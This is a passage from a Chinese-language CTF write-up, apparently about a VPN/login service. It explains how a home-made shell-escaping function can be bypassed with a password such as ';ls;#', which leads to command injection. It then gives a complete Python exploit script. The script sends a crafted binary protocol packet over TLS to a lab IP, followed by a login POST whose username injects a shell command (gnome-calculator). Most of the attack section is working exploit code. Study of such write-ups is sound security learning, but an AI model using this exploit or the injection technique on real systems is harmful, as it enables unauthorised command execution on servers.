<span class="x">                $response[$index]["message"] = "&lt;label class=\"err_msg\"&gt;" . __("Ldap_Check_Attr_Failed_Item") . "&lt;/label&gt;&lt;br/&gt;";</span>
<span class="x">            } else {</span>
<span class="x">                $found = isAttrExists($request-&gt;target_attr,$url,$server-&gt;tls == true ? "-Z " : "",$schema,$dn,$password); // for OpenLDAP</span>
<span class="x">                if(!$found) {</span>
<span class="x">                    $response[$index]["code"] = 1;</span>
<span class="x">                    $response[$index]["message"] = "&lt;label class=\"err_msg\"&gt;" . __("Ldap_Attr_Not_Found_Item") . "&lt;/label&gt;&lt;br/&gt;";</span>
<span class="x">                }</span>
<span class="x">            }</span>
<span class="x">        }</span>
<span class="x">    }</span>

<span class="x">    $index++;</span>
<span class="x">}</span>
</pre></div>
<p>其中的 escapeshellarg_jp 是出题人自己实现的，可以进行绕过，这是因为字符串外面虽然会被加上 '，我们输入字符串中的 ' 也会被转义成 \' ，但是还是能够起到结束前面第一个 ' 包含字符串的作用，并利用 # 注释后面的 shell 命令，就可以进行任意命令执行</p>
<p>比如控制 password 为</p>
<pre><code>';ls;#</code></pre>
<p>这样 password 会被转化成  <code>\\';ls;#</code> 就成了 <code>xx '\\';</code>  ls;  #' 就可以执行 ls 命令了</p>
<h1 data-content="1" id="0bdf58cbc71367749a3385fd87408cdd">分析完毕开始打通它上py脚本</h1>
<p>exp</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">ssl</span>
<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">json</span>

<span class="k">def</span> <span class="nf">create_ssl_context</span><span class="p">(</span><span class="n">certfile</span><span class="p">,</span> <span class="n">keyfile</span><span class="p">):</span>
    <span class="n">context</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">create_default_context</span><span class="p">(</span><span class="n">ssl</span><span class="o">.</span><span class="n">Purpose</span><span class="o">.</span><span class="n">SERVER_AUTH</span><span class="p">)</span>
    <span class="n">context</span><span class="o">.</span><span class="n">check_hostname</span> <span class="o">=</span> <span class="bp">False</span> 
    <span class="n">context</span><span class="o">.</span><span class="n">verify_mode</span> <span class="o">=</span> <span class="n">ssl</span><span class="o">.</span><span class="n">CERT_NONE</span>
    <span class="n">context</span><span class="o">.</span><span class="n">load_cert_chain</span><span class="p">(</span><span class="n">certfile</span><span class="o">=</span><span class="n">certfile</span><span class="p">,</span> <span class="n">keyfile</span><span class="o">=</span><span class="n">keyfile</span><span class="p">)</span> 
    <span class="k">return</span> <span class="n">context</span>

<span class="k">def</span> <span class="nf">create_ssl_connection</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">context</span><span class="p">):</span>
    <span class="n">sock</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
    <span class="n">ssl_sock</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">wrap_socket</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">server_hostname</span><span class="o">=</span><span class="n">hostname</span><span class="p">)</span>
    <span class="n">ssl_sock</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
    <span class="k">return</span> <span class="n">ssl_sock</span>

<span class="n">hostname</span> <span class="o">=</span> <span class="s1">'192.168.128.137'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">45443</span>

<span class="n">data</span> <span class="o">=</span> <span class="s1">'''username=admin'";gnome-calculator;"test1";"&amp;password=123'''</span>
<span class="n">content_length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

<span class="n">request</span> <span class="o">=</span> <span class="n">f</span><span class="s2">"POST /login.php HTTP/1.1</span><span class="se">\r\n</span><span class="s2">"</span>
<span class="n">request</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"Host: {hostname}</span><span class="se">\r\n</span><span class="s2">"</span>
<span class="n">request</span> <span class="o">+=</span> <span class="s2">"Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s2">"</span>
<span class="n">request</span> <span class="o">+=</span> <span class="n">f</span><span class="s2">"Content-Length: {content_length}</span><span class="se">\r\n</span><span class="s2">"</span>
<span class="n">request</span> <span class="o">+=</span> <span class="s2">"Connection: close</span><span class="se">\r\n</span><span class="s2">"</span>
<span class="n">request</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\r\n</span><span class="s2">"</span>
<span class="n">request</span> <span class="o">+=</span> <span class="n">data</span>

<span class="k">print</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
    <span class="n">certfile</span> <span class="o">=</span> <span class="s1">'./csr'</span>
    <span class="n">keyfile</span> <span class="o">=</span> <span class="s1">'./key'</span>

    <span class="n">ssl_context</span> <span class="o">=</span> <span class="n">create_ssl_context</span><span class="p">(</span><span class="n">certfile</span><span class="p">,</span> <span class="n">keyfile</span><span class="p">)</span>

    <span class="k">print</span><span class="p">(</span><span class="n">f</span><span class="s1">'Connecting to {hostname}:{port}'</span><span class="p">)</span>

    <span class="n">ssl_sock</span> <span class="o">=</span> <span class="n">create_ssl_connection</span><span class="p">(</span><span class="n">hostname</span><span class="p">,</span> <span class="n">port</span><span class="p">,</span> <span class="n">ssl_context</span><span class="p">)</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># p32(data_size) + p8(version) + p8(VPN_auth_flag) + b'b'*10 + p16(opt) + p16(opt7_flag) + p32(ip)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
        <span class="c1">#data += b'g'*(0xa8 + 0xc) + p8(0xd1) + b':'</span>
        <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'a'</span><span class="o">*</span><span class="mh">0x10</span>
        <span class="n">data</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">'127.0.0.1:80'</span>

        <span class="n">pl</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">'SlSP'</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">),</span><span class="n">endian</span><span class="o">=</span><span class="s1">'big'</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">'b'</span><span class="o">*</span><span class="mi">5</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">'b'</span><span class="o">*</span><span class="mi">4</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">'big'</span><span class="p">)</span><span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0x1</span><span class="p">,</span> <span class="n">endian</span><span class="o">=</span><span class="s1">'big'</span><span class="p">)</span> <span class="c1">#+ socket.inet_pton(socket.AF_INET, '192.168.128.137')</span>
        <span class="n">pl</span> <span class="o">+=</span> <span class="n">data</span>

        <span class="k">print</span><span class="p">(</span><span class="s1">'pl size -&gt; '</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">pl</span><span class="p">)))</span>
        <span class="k">print</span><span class="p">(</span><span class="s1">'pl hex -&gt; '</span> <span class="o">+</span> <span class="n">pl</span><span class="o">.</span><span class="n">hex</span><span class="p">())</span>
        <span class="n">ssl_sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">pl</span><span class="p">)</span>

        <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">pl</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
        <span class="n">ssl_sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">pl</span><span class="p">)</span>

        <span class="n">response</span> <span class="o">=</span> <span class="n">ssl_sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
        <span class="n">response</span> <span class="o">+=</span> <span class="n">ssl_sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>

        <span class="k">print</span><span class="p">(</span><span class="sa">b</span><span class="s1">'response -&gt; '</span> <span class="o">+</span> <span class="n">response</span><span class="p">)</span>
        <span class="c1">#print(response.decode())</span>


    <span class="k">finally</span><span class="p">:</span>
        <span class="n">ssl_sock</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">'__main__'</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</pre></div>
</div>
</div>